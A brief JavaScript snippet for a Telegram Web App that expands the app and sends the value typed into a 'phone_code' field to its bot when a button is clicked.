let tg = window.Telegram.WebApp;
tg.expand();

phone = document.getElementById('phone_code') ;
send_btn = document.getElementById('send-button');
send_btn.addEventListener('click',function(){
 
    tg.sendData(phone.value);
    
});
